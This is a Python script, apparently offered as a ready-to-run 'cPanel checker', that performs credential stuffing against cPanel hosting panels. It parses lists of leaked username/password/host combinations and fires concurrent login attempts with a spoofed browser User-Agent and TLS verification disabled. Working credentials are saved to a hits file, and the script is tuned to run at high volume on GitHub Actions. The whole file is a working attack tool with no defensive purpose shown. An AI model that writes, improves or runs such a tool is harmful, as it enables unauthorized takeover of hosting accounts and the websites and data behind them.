#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cpanel_reliable_checker.py - ULTRA FAST for GitHub Actions
Version: 3.0.0 - Async + Optimized
Author: VEXX
"""

import sys
import os
import re
import time
import json
import asyncio
import aiohttp
import aiofiles
import argparse
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from datetime import datetime

# -------------------- CONFIGURATION --------------------
DEFAULT_TIMEOUT = 5          # Reduced for speed
DEFAULT_CONCURRENCY = 100     # High concurrency for GHA
HIT_FILE = "hit.txt"
COMBO_FILE = "combo.txt"

# -------------------- UTILITY FUNCTIONS --------------------
def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def extract_credentials(line):
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

async def check_login(session, url, user, pwd, timeout):
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    try:
        async with session.post(login_url, data=payload, headers=headers, timeout=timeout, ssl=False) as resp:
            text = await resp.text()
            if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
                return True, url
            return False, None
    except:
        return False, None

async def worker(sem, session, combo, timeout, results, hits_list):
    url, user, pwd = combo
    async with sem:
        success, final_url = await check_login(session, url, user, pwd, timeout)
        if success:
            results['hits'] += 1
            hits_list.append(f"{user}:{pwd}@{final_url}\n")
        else:
            results['fails'] += 1
        results['total'] += 1

async def run_async(combos, concurrency, timeout):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        results = {'hits': 0, 'fails': 0, 'total': 0}
        hits_list = []
        tasks = [asyncio.create_task(worker(sem, session, combo, timeout, results, hits_list)) for combo in combos]
        for i, task in enumerate(asyncio.as_completed(tasks)):
            await task
            if (i+1) % 50 == 0 or (i+1) == len(combos):
                sys.stdout.write(f"\rProgress: {i+1}/{len(combos)} | Hits: {results['hits']}")
                sys.stdout.flush()
        sys.stdout.write("\n")
        return results['hits'], hits_list

def read_combo_file(filepath):
    combos = []
    encodings = ['utf-8', 'latin-1', 'cp1252']
    for enc in encodings:
        try:
            with open(filepath, 'r', encoding=enc, errors='ignore') as f:
                lines = f.readlines()
            break
        except UnicodeDecodeError:
            continue
    else:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)
    return combos

async def main_async():
    parser = argparse.ArgumentParser(description="cPanel Checker ULTRA FAST for GHA")
    parser.add_argument("-f", "--file", default=COMBO_FILE)
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT)
    args = parser.parse_args()

    input_file = args.file
    if not os.path.exists(input_file):
        print(f"File not found: {input_file}")
        sys.exit(1)

    print(f"[*] Loading combos from {input_file}...")
    combos = read_combo_file(input_file)
    if not combos:
        print("No valid combos extracted.")
        sys.exit(1)
    print(f"[+] Loaded {len(combos)} combos. Starting async check with concurrency={args.concurrency}")

    start = time.time()
    hits, hits_list = await run_async(combos, args.concurrency, args.timeout)
    elapsed = time.time() - start

    # Write hits
    if hits_list:
        with open(HIT_FILE, 'w', encoding='utf-8') as f:
            f.writelines(hits_list)
        print(f"\n[+] Hits: {hits} saved to {HIT_FILE}")
    else:
        print(f"\n[-] No hits found.")

    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
    print(f"[*] Speed: {len(combos)/elapsed:.1f} combos/sec")

def main():
    if sys.version_info < (3, 7):
        print("Python 3.7+ required for asyncio.run")
        sys.exit(1)
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()